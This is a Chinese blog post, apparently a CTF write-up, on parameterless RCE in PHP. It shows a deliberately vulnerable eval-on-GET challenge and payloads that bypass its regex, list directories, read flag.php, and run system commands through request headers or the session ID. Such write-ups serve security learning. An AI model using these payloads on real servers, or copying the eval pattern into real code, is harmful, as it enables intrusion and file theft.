+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(string,find,start)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>string</em></td>
+<td align="left">必需。规定要搜索的字符串。</td>
+</tr>
+<tr>
+<td align="left"><em>find</em></td>
+<td align="left">必需。规定要查找的字符串。</td>
+</tr>
+<tr>
+<td align="left"><em>start</em></td>
+<td align="left">可选。规定在何处开始搜索。</td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strpos(<span class="string">&quot;You love php, I love php too!&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20200912113134307.png" alt="image-20200912113134307"></p>
+<p>相关函数：</p>
+<ul>
+<li><ul>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_stripos.asp">stripos()</a> - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_strripos.asp">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_strrpos.asp">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li>
+</ul>
+</li>
+</ul>
+<h4 id="二、无参数RCE题目问题"><a href="#二、无参数RCE题目问题" class="headerlink" title="二、无参数RCE题目问题"></a>二、无参数RCE题目问题</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<h5 id="1-code传参"><a href="#1-code传参" class="headerlink" title="1.code传参"></a>1.code传参</h5><p>这个正则匹配是匹配字符串+（）</p>
+<p>看到有eval函数，就从这里切入，传参给code。而正常带参数的函数会被正则匹配过滤掉，所以用嵌套函数。</p>
+<p>使用scandir(.)获取当前目录</p>
+<p>因为这里有正则过滤，所以scandir的”.”要用其他的函数来构造出来。这里有两种方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(chr(pos(localtime()))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(pos(localeconv())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//这两种方法就是构造点的方法不一样，原理都是一样，用scandir读取目录</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20200906155734836.png" alt="image-20200906155734836"></p>
+<p>使用end读取最后一个文件名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(scandir(pos(localeconv()))));</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20200906155853112.png" alt="image-20200906155853112"></p>
+<p>使用readfile读取flag.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(readfile(end(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20200906160031122.png" alt="image-20200906160031122"></p>
+<h5 id="2-利用session传参"><a href="#2-利用session传参" class="headerlink" title="2.利用session传参"></a>2.利用session传参</h5><p>session和cookie的功能作用相同，区别在于session记录在服务端，cookie作用在客户端。</p>
+<p>session有两种实现方式，一种是通过cookies实现（把session的id放在cookie里面），另一种是通过重写URL实现（当浏览器不支持cookie的时候就会使用这种方式实现session）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>
+
+<p>第一步，将show_source(session_id(session_start()));传进code</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20200912155859696.png" alt="image-20200912155859696"></p>
+<p>第二步，用HackBar将PHPSESSID=flag.php传进去，就得到了flag</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20200912160008187.png" alt="image-20200912160008187"></p>
+<h5 id="3-利用getallheaders-来获取参数RCE"><a href="#3-利用getallheaders-来获取参数RCE" class="headerlink" title="3.利用getallheaders()来获取参数RCE"></a>3.利用<code>getallheaders()</code>来获取参数RCE</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getallheaders();<span class="comment">//取得所有HTTP请求标头</span></span><br><span class="line"><span class="keyword">echo</span>(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure>
+
+<p>在请求那里输入ls，读取目录。可以看到读到了三个文件</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20200912160850720.png" alt="image-20200912160850720"></p>
+<p>输入cat flag.php就可以读取flag</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20200912161625637.png" alt="image-20200912161625637"></p>
+<h5 id="跳转目录情况"><a href="#跳转目录情况" class="headerlink" title="跳转目录情况"></a>跳转目录情况</h5><ul>
+<li><p>如果遇到flag在上层目录文件的情况，我们需要跳转到上层目录。</p>
+</li>
+<li><p><code>chdir()</code>函数当参数为两个点的时候能够跳转到上层目录。</p>
+</li>
+<li><p><code>scandir()</code>，读取当前目录在第二个元素就能读取两个点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//参数为一个点的时候读取根目录。</span></span><br><span class="line"></span><br><span class="line">scandir(pos(localeconv())) </span><br><span class="line">或scandir(chr(pos(localtime()))</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>localtime第一个参数是时间戳，所以我们不能直接嵌套，需要带一个time函数作为嵌套、time函数能够返回时间戳</p>
+</li>
+<li><p>构造读取上层目录payload</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>构造读取上层目录文件payload</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
+
+<h5 id="其他小技巧"><a href="#其他小技巧" class="headerlink" title="其他小技巧"></a>其他小技巧</h5><p>利用三角函数构造斜杠</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))))；</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用随机令牌构造点</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(implode(scandir(chr(strrev(uniqid())))));</span><br></pre></td></tr></table></figure>
+
+<h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">array_reverse() 以相反的元素顺序返回数组</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line">localeconv() 返回当地金融信息，其中第一个元素是点</span><br><span class="line">readfile()  输出一个文件</span><br><span class="line"><span class="keyword">echo</span>(implode(scandir(chr(strrev(uniqid()))))); 随机令牌构造点</span><br><span class="line">chr(pos(localtime())) 利用当前秒数构造点    </span><br><span class="line">chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile()))))))))) 利用三角函数构造斜杠</span><br><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           current() 的别名</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()       将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">chr() 函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin — 转换十六进制字符串为二进制字符串</span><br><span class="line">getenv()        获取一个环境变量的值(在<span class="number">7.1</span>之后可以不给予参数)</span><br><span class="line">show_source(); 高亮读取文件</span><br><span class="line">highlight_file();高亮读取文件</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2020/09/12/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" title="无参数RCE" target="_blank" rel="external">http://example.com/2020/09/12/%E6%97%A0%E5%8F%82%E6%95%B0RCE/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/cofess" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/cofess" target="_blank"><span class="text-dark">chickenmushroom</span><small class="ml-1x">Web</small></a></h3>
+        <div>平平无奇的小红帽。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2020/09/15/SSRF/" title="SSRF"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="Catalogue" role="button">
+        <span>[&nbsp;</span><span>Catalogue</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="/null" target="_blank" title="Github" ><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Weibo" ><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Twitter" ><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Behance" ><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" ><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
